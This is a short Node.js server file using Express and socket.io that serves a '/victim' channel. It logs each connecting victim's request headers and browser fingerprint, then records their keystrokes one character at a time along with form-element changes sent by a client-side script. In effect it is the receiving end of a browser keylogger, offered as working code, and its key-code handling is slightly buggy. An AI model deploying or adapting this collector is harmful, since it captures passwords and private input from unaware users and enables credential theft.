var path = require('path')
var express = require('express')
var app = express()
var server = require('http').Server(app)
var io = require('socket.io')(server)
var victim
app.use(express.static('.'));

victim = io
   .of('/victim')
   .on('connection', function(socket){

	console.log('$$ victim connected $$');
	
	var acceptHeader = socket.handshake.headers
	console.log("accept header: ")
	console.log(acceptHeader)

	var user = "null";

	socket.on('new', function(n){
		console.log("fingerprint: ")
		console.log(n.msg);
		console.log('\n')
		user = n.msg;
	});

	socket.on('update', function(change){

	   switch(change.type){
		case 'type':
		   charCode = String.fromCharCode(change.msg)
		    console.log(user+ ' : ' + charCode)
			switch(change.type){
			case 8: //backspace
	 		console.log(user+ ' : *backspace*')
			break;
			case 13: //space
	 		console.log(user+ ' : *space*')
			break;
			case 32: //new line
	 		console.log(user+ ' : *newline*')
			break;
		   	}
	 	break;
		case 'element-change':
		   console.log(user+ ' change to: '+ change.msg)
		break;
		}
        });

	socket.on('disconnect', function(){
	   console.log('victim disconnected');
	});
   });

server.listen(3000, function(){
   console.log('listening on :3000');
});
